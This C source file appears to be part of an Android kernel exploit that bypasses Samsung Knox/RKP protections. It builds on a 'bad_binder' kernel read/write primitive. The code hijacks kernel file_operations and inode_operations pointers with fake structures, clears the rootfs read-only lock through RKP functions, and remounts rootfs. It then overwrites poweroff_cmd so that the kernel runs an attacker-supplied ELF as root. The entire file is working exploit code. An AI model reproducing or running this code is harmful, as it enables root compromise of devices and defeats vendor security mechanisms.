#include <fcntl.h>
#include <stdio.h>
#include <libgen.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdbool.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/mount.h>

#include "kallsyms.h"
#include "kernel_rw.h"
#include "bad_binder.h"
#include "kernel_defs.h"
#include "knox_bypass.h"


static int32_t allocate_kernel_memory(uint64_t pFile, int32_t iInitFd, uint64_t pPoweroffCmd, uint64_t* ppKernelMem)
{
    int32_t iRet = -1;
    uint64_t pVzalloc = 0;
    uint64_t pFileOps = 0;
    uint64_t pFakeFileOps = 0;
    uint64_t ulReplaceVal = 0;
    bool bPowerOffWrite = false;
    bool bFileOpsWrite = false;
    uint32_t uiAllocAddr = 0;
    uint64_t pKernelMem = 0;
    uint64_t ulAllocSz = KMEM_ALLOC_SIZE;

    pVzalloc = get_kernel_sym_addr("vzalloc");

    if(!IS_KERNEL_POINTER(pVzalloc))
    {
        printf("[-] failed to get address of vmalloc_exec!\n");
        goto done;
    }

    printf("[+] found vzalloc ptr: %lx\n", pVzalloc);

    pFileOps = kernel_read_ulong(pFile + FILE_OPS_FILE_OFFSET);

    if(!IS_KERNEL_POINTER(pFileOps))
    {
        printf("[-] failed to get pointer to file_operations!\n");
        goto done;
    }

    // The file_operations structure itself is write protected, but the pointer to it in the file structure
    // can be overwriten. This area of memory is used to place the fake file_oerpations structure, since it's
    // writable and not used for anything.
    pFakeFileOps = pPoweroffCmd;
    
    // Save the value to be overwritten, so we can be restore it when we're done.  
    ulReplaceVal = kernel_read_ulong(pFakeFileOps + CHECK_FLAGS_FILE_OPS_OFFSET);

    if(sizeof(uint64_t) != kernel_write_ulong(pFakeFileOps + CHECK_FLAGS_FILE_OPS_OFFSET, pVzalloc))
    {
        printf("[-] failed to write to fake file_operations location!\n");
        goto done;
    }

    bPowerOffWrite = true;

    if(sizeof(uint64_t) != kernel_write_ulong(pFile + FILE_OPS_FILE_OFFSET, pFakeFileOps))
    {
        printf("[-] failed to overwrite file_operations pointer in kernel file structure!\n");
        goto done;
    }

    bFileOpsWrite = true;

    uiAllocAddr = fcntl(iInitFd, F_SETFL, ulAllocSz);
    
    // Guess the top half of the address, since we can only capture them bottom. 
    pKernelMem = (KERNEL_BASE & 0xFFFFFFFF00000000) + uiAllocAddr;

    if(0 != check_kernel_memory_valid(pKernelMem, ulAllocSz))
    {
        printf("[-] the returned memory address is invalid!\n");
        goto done;
    }

    printf("[+] allocated %lx bytes of memory at %lx\n", ulAllocSz, pKernelMem);

    *ppKernelMem = pKernelMem;

    iRet = 0;

done:
    
    if(bFileOpsWrite)
    {
        if(sizeof(uint64_t) != kernel_write_ulong(pFile + FILE_OPS_FILE_OFFSET, pFileOps))
        {
            printf("[-] warning, failed to restore file_operations in /init kernel file structure!");
        }

        bFileOpsWrite = false;
    }
   
    if(bPowerOffWrite)
    {
        if(sizeof(uint64_t) != kernel_write_ulong(pFakeFileOps + CHECK_FLAGS_FILE_OPS_OFFSET, ulReplaceVal))
        {
            printf("[-] warning! failed to restore overwritten value in poweroff_cmd\n");
        }

        bPowerOffWrite = false;
    }

    return iRet;
}

static int32_t set_rootfs_mnt_flags(uint64_t pFile, int32_t iInitFd, uint64_t pKernelMem)
{
    int iRet = -1;
    uint64_t pRkpAssignMntFlags = 0;
    uint64_t pRkpResetMntFlags = 0;
    uint64_t pMount = 0;
    uint32_t uiMntFlags = 0;
    uint64_t pDentry = 0;
    uint64_t pInode = 0;
    uint64_t pInodeOps = 0;
    uint64_t pFakeDentry = 0;
    uint64_t pFakeInodeOps = 0;
    bool bDentryWrite = false;
    bool bInodeOpsWrite = false;
    struct stat statbuff = {0};

    pRkpAssignMntFlags = get_kernel_sym_addr("rkp_assign_mnt_flags");

    if(!IS_KERNEL_POINTER(pRkpAssignMntFlags))
    {
        printf("[-] failed to get address of rkp_assign_mnt_flags!\n");
        goto done;
    }

    printf("[+] found rkp_assign_mnt_flags ptr: %lx\n", pRkpAssignMntFlags);

    pRkpResetMntFlags = get_kernel_sym_addr("rkp_reset_mnt_flags");

    if(!IS_KERNEL_POINTER(pRkpResetMntFlags))
    {
        printf("[-] failed to get address of rkp_reset_mnt_flags!\n");
        goto done;
    }

    printf("[+] found rkp_reset_mnt_flags ptr: %lx\n", pRkpResetMntFlags);

    pMount = kernel_read_ulong(pFile + MNT_FILE_OFFSET);

    if(!IS_KERNEL_POINTER(pMount))
    {
        printf("[-] failed to get address of mnt!\n");
        goto done;
    }

    uiMntFlags = kernel_read_uint(pMount + MNT_FLAGS_MNT_OFFSET);

    printf("[!] current rootfs mnt flags: %0x\n", uiMntFlags);

    pDentry = kernel_read_ulong(pFile + DENTRY_FILE_OFFSET);

    if(!IS_KERNEL_POINTER(pDentry))
    {
        printf("[-] failed to get address of dentry!\n");
        goto done;
    }

    pInode = kernel_read_ulong(pDentry + INODE_DENTRY_OFFSET);

    if(!IS_KERNEL_POINTER(pInode))
    {
        printf("[-] failed to get address of inode!\n");
        goto done;
    }

    pInodeOps = kernel_read_ulong(pInode + INODE_OPS_INODE_OFFSET);

    if(!IS_KERNEL_POINTER(pInodeOps))
    {
        printf("[-] failed to get address of inode_operations!\n");
        goto done;
    }

    // There's definitely a better way to do this, but I'm lazy.
    // Someone smarter than me can improve it if they want.

    if(0 == (pKernelMem & 0xFFFFF))
    {
        pFakeDentry = pKernelMem;
    }

    else
    {
        // Get the first address of allocation where the lowest five digits are 0 
        pFakeDentry = (pKernelMem + KMEM_ALLOC_SIZE) & 0xFFFFFFFFFFF00000;
    }

    // Keep existing mnt flags except for the lock flag digit
    pFakeDentry += (uiMntFlags & 0xFFFFF);
    pFakeInodeOps = pFakeDentry + INODE_DENTRY_OFFSET + sizeof(uint64_t);

    // Check if the fake structure addresses overrun allocated kernel memory
    if(KMEM_ALLOC_SIZE < ((pFakeInodeOps + GET_ATTR_INODE_OPS_OFFSET + sizeof(uint64_t)) - pKernelMem))
    {
        printf("[-] kernel memory allocation not in our favor...\n");
        goto done;
    }

    if(sizeof(uint64_t) != kernel_write_ulong(pFakeDentry + INODE_DENTRY_OFFSET, pInode))
    {
        printf("[-] failed to write to allocated kernel memory\n");
        goto done;
    }

    if(sizeof(uint64_t) != kernel_write_ulong(pFakeInodeOps + GET_ATTR_INODE_OPS_OFFSET, pRkpAssignMntFlags))
    {
        printf("[-] failed to write to allocated kernel memory\n");
        goto done;
    }

    if(sizeof(uint64_t) != kernel_write_ulong(pFile + DENTRY_FILE_OFFSET, pFakeDentry))
    {
        printf("[-] failed to write fake dentry to file structure!\n");
        goto done;
    }

    bDentryWrite = true;

    if(sizeof(uint64_t) != kernel_write_ulong(pInode + INODE_OPS_INODE_OFFSET, pFakeInodeOps))
    {
        printf("[-] failed to write fake inode_operations ptr to inode structure!\n");
        goto done;
    }

    bInodeOpsWrite = true;

    fstat(iInitFd, &statbuff);

    pFakeDentry -= (uiMntFlags & 0xFFFFF);

    if(sizeof(uint64_t) != kernel_write_ulong(pFakeDentry + INODE_DENTRY_OFFSET, pInode))
    {
        printf("[-] failed to write to allocated kernel memory\n");
        goto done;
    }

    if(sizeof(uint64_t) != kernel_write_ulong(pFakeInodeOps + GET_ATTR_INODE_OPS_OFFSET, pRkpResetMntFlags))
    {
        printf("[-] failed to write to allocated kernel memory\n");
        goto done;
    }

    if(sizeof(uint64_t) != kernel_write_ulong(pFile + DENTRY_FILE_OFFSET, pFakeDentry))
    {
        printf("[-] failed to write fake dentry to file structure!\n");
        goto done;
    }

    fstat(iInitFd, &statbuff);

    uiMntFlags = kernel_read_uint(pMount + MNT_FLAGS_MNT_OFFSET);

    printf("[!] new rootfs mnt flags: %0x\n", uiMntFlags);

    if(uiMntFlags & MNT_LOCK_READONLY)
    {
        printf("[-] failed to unset read-only lock mount flag!\n");
        goto done;
    }

    iRet = 0;

done:

    if(bDentryWrite)
    {
        if(sizeof(uint64_t) != kernel_write_ulong(pFile + DENTRY_FILE_OFFSET, pDentry))
        {
            printf("[-] warning! failed to restore overwritten dentry ptr to file structure!\n");
            printf("[-] this will probably make your phone crash...\n");
        }
    }

    if(bInodeOpsWrite)
    {
        if(sizeof(uint64_t) != kernel_write_ulong(pInode + INODE_OPS_INODE_OFFSET, pInodeOps))
        {
            printf("[-] warning! failed to restore overwritten inode_operations ptr to inode structure!\n");
        }
    }

    return iRet;
}

static int32_t remount_rootfs(uint64_t pTaskStruct, int32_t iInitFd, uint64_t pPoweroffCmd, uint64_t* ppFile)
{
    int32_t iRet = -1;
    uint64_t pFilesStruct = 0;
    uint64_t pFdTable = 0;
    uint64_t pFdArray = 0;
    uint64_t pFile = 0;
    uint64_t pKernelMem = 0;
    
    pFilesStruct = kernel_read_ulong(pTaskStruct + FILES_STRUCT_TASK_OFFSET);

    if(!IS_KERNEL_POINTER(pFilesStruct))
    {
        printf("[-] failed to get pointer to files_struct!\n");
        goto done;
    }

    pFdTable = kernel_read_ulong(pFilesStruct + FDTABLE_FILES_STRUCT_OFFSET);

    if(!IS_KERNEL_POINTER(pFdTable))
    {
        printf("[-] failed to get pointer to fdtable!\n");
        goto done;
    }

    pFdArray = kernel_read_ulong(pFdTable + FD_ARRAY_FDTABLE_OFFSET);

    if(!IS_KERNEL_POINTER(pFdArray))
    {
        printf("[-] failed to get pointer to fd array!\n");
        goto done;
    }

    pFile = kernel_read_ulong(pFdArray + iInitFd*sizeof(uint64_t));

    if(!IS_KERNEL_POINTER(pFile))
    {
        printf("[-] failed to get kernel file structure ptr!\n");
        goto done;
    }

    if(0 == mount("rootfs", "/", "rootfs", MS_REMOUNT|MS_SHARED, NULL))
    {
        printf("[+] rootfs not read-only locked!\n");
        printf("[+] remount successful!\n");
        iRet = 0;
        goto done;
    }

    printf("[!] can't do a remount the easy way...\n");
    printf("[!] time for plan B!\n");

    if(0 != allocate_kernel_memory(pFile, iInitFd, pPoweroffCmd, &pKernelMem))
    {
        printf("[-] failed to allocate kernel memory!\n");
        goto done;
    }

    if(0 != set_rootfs_mnt_flags(pFile, iInitFd, pKernelMem))
    {
        printf("[-] failed to set rootfs mnt flags!\n");
        goto done;
    }

    if(0 != mount("rootfs", "/", "rootfs", MS_REMOUNT|MS_SHARED, NULL))
    {
        printf("[-] remount failed! \n");
        goto done;
    }

    iRet = 0;

done:

    if(0 == iRet)
    {
        *ppFile = pFile;
    }

    return iRet;
}

static int32_t exec_elf_as_root(uint64_t pThreadInfo, uint64_t pFile, int32_t iInitFd, uint64_t pPoweroffCmd, uint64_t pOrderlyPoweroff, char* pszFileName, void* pFileMap, uint32_t uiSize)
{
    int32_t iRet = -1;
    uint32_t uiNameLen = 0;
    int32_t iFd = -1;
    uint64_t ulAddrLimit = USER_DS;
    uint64_t pTaskStruct = 0;
    uint64_t pFileOps = 0;
    uint64_t pFakeFileOps = 0;
    uint64_t ulReplaceVal = 0;
    bool bPowerOffWrite = false;
    bool bFileOpsWrite = false;

    uiNameLen = strlen(pszFileName) + 1;

    iFd = open(pszFileName, O_RDWR|O_CREAT, 0777);

    if(0 > iFd)
    {
        printf("[-] failed to create file on rootfs!\n");
        goto done;
    }

    printf("[!] dropping kernel r/w to write file to rootfs\n");

    if(sizeof(uint64_t) != kernel_write_ulong(pThreadInfo + ADDR_LIMIT_THREAD_INFO_OFFSET, ulAddrLimit))
    {
        printf("[-] failed to restore current thread's addr_limit to its original state\n");
        goto done;
    }

    if(uiSize != write(iFd,pFileMap, uiSize))
    {
        printf("[-] failed to write to rootfs file!\n");
        goto done;
    }

    close(iFd);
    iFd = -1;

    printf("[!] rexploiting to regain kernel r/w\n");

    if(0 != do_bad_binder(&pTaskStruct, &pThreadInfo))
    {
        printf("[-] failed to reexploit!\n");
        goto done;
    }

    pFileOps = kernel_read_ulong(pFile + FILE_OPS_FILE_OFFSET);

    if(!IS_KERNEL_POINTER(pFileOps))
    {
        printf("[-] failed to get pointer to file_operations!\n");
        goto done;
    }

    // The file_operations structure itself is write protected, but the pointer to it in the file structure
    // can be overwriten. This area of memory is used to place the fake file_oerpations structure, since it's
    // writable and not used for anything.
    pFakeFileOps = pPoweroffCmd;
    
    // Save the value to be overwritten, so we can be restore it when we're done.  
    ulReplaceVal = kernel_read_ulong(pFakeFileOps + CHECK_FLAGS_FILE_OPS_OFFSET);

    if(sizeof(uint64_t) != kernel_write_ulong(pFakeFileOps + CHECK_FLAGS_FILE_OPS_OFFSET, pOrderlyPoweroff))
    {
        printf("[-] failed to write to fake file_operations location!\n");
        goto done;
    }

    if(uiNameLen != kernel_write(pPoweroffCmd, pszFileName, uiNameLen))
    {
        printf("[-] failed to overwrite poweroff_cmd!\n");
        goto done;
    }

    bPowerOffWrite = true;

    if(sizeof(uint64_t) != kernel_write_ulong(pFile + FILE_OPS_FILE_OFFSET, pFakeFileOps))
    {
        printf("[-] failed to overwrite file_operations pointer in kernel file structure!\n");
        goto done;
    }

    bFileOpsWrite = true;

    fcntl(iInitFd, F_SETFL, 0x0);

    printf("[!] sleeping to wait for kernel to execute workqueue before restoring poweroff_cmd\n");
    sleep(3);

    iRet = 0;

done:

    if(bFileOpsWrite)
    {
        if(sizeof(uint64_t) != kernel_write_ulong(pFile + FILE_OPS_FILE_OFFSET, pFileOps))
        {
            printf("[-] warning, failed to restore file_operations in /init kernel file structure!");
        }

        bFileOpsWrite = false;
    }

    if(bPowerOffWrite)
    {
        if(sizeof(uint64_t) != kernel_write_ulong(pFakeFileOps + CHECK_FLAGS_FILE_OPS_OFFSET, ulReplaceVal))
        {
            printf("[-] warning! failed to restore overwritten value in poweroff_cmd\n");
        }

        if(0xF != kernel_write(pPoweroffCmd, "/sbin/poweroff", 0xF))
        {
            printf("[-] warning! failed to restore overwritten value in poweroff_cmd\n");
        }

        bPowerOffWrite = false;
    }
    
    if(0 <= iFd)
    {
        close(iFd);
        iFd = -1;
    }

    return iRet;
}

int32_t do_knox_bypass(uint64_t pTaskStruct, uint64_t pThreadInfo, char* pszRootExecPath)
{
    int32_t iRet = -1;
    char* pszElfName = NULL;
    size_t name_sz = 0;
    char* pszRootfsElfName = NULL;
    int32_t iElfFd = -1;
    struct stat statbuff = {0};
    void* pElfMap = MAP_FAILED;
    uint64_t pOrderlyPoweroff = 0;
    uint64_t pPoweroffCmd = 0;
    int32_t iInitFd = -1;
    uint64_t pFile = 0;
  
    pszElfName = basename(pszRootExecPath);

    if(NULL == pszElfName)
    {
        printf("[-] failed to get basename of elf path!\n");
        goto done;
    }

    name_sz = strlen(pszElfName);

    if(CHECK_FLAGS_FILE_OPS_OFFSET <= (name_sz + 2))
    {
        printf("[-] elf name too long!\n");
        printf("[-] don't make me do string stuff!\n");
        goto done;
    }

    pszRootfsElfName = malloc(name_sz + 2);

    if(NULL == pszRootfsElfName)
    {
        printf("[-] failed to allocate memory!\n");
        goto done;
    }

    strcpy(pszRootfsElfName, "/");
    strcat(pszRootfsElfName, pszElfName);

    iElfFd = open(pszRootExecPath, O_RDONLY);

    if(0 > iElfFd)
    {
        printf("[-] failed to open elf file!\n");
        goto done;
    }

    if(0 != fstat(iElfFd, &statbuff))
    {
        printf("[-] failed to stat elf file!\n");
        goto done;
    }

    pElfMap = mmap(NULL, statbuff.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, iElfFd, 0);

    if(MAP_FAILED == pElfMap)
    {
        printf("[-] failed to map elf file!\n");
        goto done;
    }

    pOrderlyPoweroff = get_kernel_sym_addr("orderly_poweroff");

    if(!IS_KERNEL_POINTER(pOrderlyPoweroff))
    {
        printf("[-] failed to get address of orderly_poweroff!\n");
        goto done;
    }

    printf("[+] found orderly_poweroff ptr: %lx\n", pOrderlyPoweroff);

    pPoweroffCmd = get_kernel_sym_addr("poweroff_cmd");

    if(!IS_KERNEL_POINTER(pPoweroffCmd))
    {
        printf("[-] failed to get address of poweroff_cmd!\n");
        goto done;
    }

    printf("[+] found poweroff_cmd ptr: %lx\n", pPoweroffCmd);

    iInitFd = open("/init", O_RDONLY);

    if(0 > iInitFd)
    {
        printf("[-] failed to open /init file!\n");
        goto done;
    }

    printf("[!] atttempting to remount rootfs as r/w...\n");

    if(0 != remount_rootfs(pTaskStruct, iInitFd, pPoweroffCmd, &pFile))
    {
        printf("[-] failed to remount rootfs!\n");
        goto done;
    }

    if(0 != exec_elf_as_root(pThreadInfo, pFile, iInitFd, pPoweroffCmd, pOrderlyPoweroff, pszRootfsElfName, pElfMap, statbuff.st_size))
    {
        printf("[-] failed to execute elf as root!\n");
        goto done;
    }

    iRet = 0;

done:
    
    if(NULL != pszRootfsElfName)
    {
        free(pszRootfsElfName);
        pszRootfsElfName = NULL;
    }

    if(MAP_FAILED != pElfMap)
    {
        munmap(pElfMap, statbuff.st_size);
        pElfMap = MAP_FAILED;
    }

    if(0 <= iElfFd)
    {
        close(iElfFd);
        iElfFd = -1;
    }

    if(0 <= iInitFd)
    {
        close(iInitFd);
        iInitFd = -1;
    }

    return iRet;
}